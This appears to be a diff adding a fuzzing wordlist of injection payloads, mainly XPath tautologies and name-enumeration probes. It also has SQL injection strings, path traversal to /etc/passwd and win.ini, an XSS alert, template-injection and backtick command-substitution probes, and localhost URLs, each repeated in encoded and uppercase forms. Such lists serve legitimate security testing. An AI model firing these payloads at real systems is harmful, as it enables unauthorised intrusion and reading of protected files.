@@ -1,0 +1,80 @@
+' or '1'='1
+' or count(//node())>0 or 'a'='a
+' or substring(name(/*[1]),1,1)='a' or '1'='1
+' or true() or '
+" or "1"="1
+test
+baseline
+AUROSE_PROBE
+../../../../etc/passwd
+..\..\..\..\windows\win.ini
+' OR '1'='1
+" OR "1"="1
+<script>alert(1)</script>
+${7*7}
+{{7*7}}
+`id`
+127.0.0.1
+http://127.0.0.1
+https://example.com
+%27%20or%20%271%27%3D%271
+%27%20or%20count%28%2F%2Fnode%28%29%29%3E0%20or%20%27a%27%3D%27a
+%27%20or%20substring%28name%28%2F%2A%5B1%5D%29%2C1%2C1%29%3D%27a%27%20or%20%271%27%3D%271
+%27%20or%20true%28%29%20or%20%27
+%22%20or%20%221%22%3D%221
+..%2F..%2F..%2F..%2Fetc%2Fpasswd
+..%5C..%5C..%5C..%5Cwindows%5Cwin.ini
+%27%20OR%20%271%27%3D%271
+%22%20OR%20%221%22%3D%221
+%3Cscript%3Ealert%281%29%3C%2Fscript%3E
+%24%7B7%2A7%7D
+%7B%7B7%2A7%7D%7D
+%60id%60
+http%3A%2F%2F127.0.0.1
+https%3A%2F%2Fexample.com
+' OR COUNT(//NODE())>0 OR 'A'='A
+' OR SUBSTRING(NAME(/*[1]),1,1)='A' OR '1'='1
+' OR TRUE() OR '
+TEST
+BASELINE
+../../../../ETC/PASSWD
+..\..\..\..\WINDOWS\WIN.INI
+<SCRIPT>ALERT(1)</SCRIPT>
+`ID`
+HTTP://127.0.0.1
+HTTPS://EXAMPLE.COM
+%27%20OR%20COUNT%28%2F%2FNODE%28%29%29%3E0%20OR%20%27A%27%3D%27A
+%27%20OR%20SUBSTRING%28NAME%28%2F%2A%5B1%5D%29%2C1%2C1%29%3D%27A%27%20OR%20%271%27%3D%271
+%27%20OR%20TRUE%28%29%20OR%20%27
+..%2F..%2F..%2F..%2FETC%2FPASSWD
+..%5C..%5C..%5C..%5CWINDOWS%5CWIN.INI
+%3CSCRIPT%3EALERT%281%29%3C%2FSCRIPT%3E
+%60ID%60
+HTTP%3A%2F%2F127.0.0.1
+HTTPS%3A%2F%2FEXAMPLE.COM
+' or '1'%3D'1
+' or count(//node())>0 or 'a'%3D'a
+' or substring(name(/*[1]),1,1)%3D'a' or '1'%3D'1
+" or "1"%3D"1
+' OR '1'%3D'1
+" OR "1"%3D"1
+' OR COUNT(//NODE())>0 OR 'A'%3D'A
+' OR SUBSTRING(NAME(/*[1]),1,1)%3D'A' OR '1'%3D'1
+' or '1'='1?v=0
+' or '1'='1&v=0
+%27%20or%20%271%27%3D%271_0
+xpath_0
+/xpath/0
+' or '1'='1%0a0
+' or count(//node())>0 or 'a'='a?v=1
+' or count(//node())>0 or 'a'='a&v=1
+%27%20or%20count%28%2F%2Fnode%28%29%29%3E0%20or%20%27a%27%3D%27a_1
+xpath_1
+/xpath/1
+' or count(//node())>0 or 'a'='a%0a1
+' or substring(name(/*[1]),1,1)='a' or '1'='1?v=2
+' or substring(name(/*[1]),1,1)='a' or '1'='1&v=2
+%27%20or%20substring%28name%28%2F%2A%5B1%5D%29%2C1%2C1%29%3D%27a%27%20or%20%271%27%3D%271_2
+xpath_2
+/xpath/2
+' or substring(name(/*[1]),1,1)='a' or '1'='1%0a2
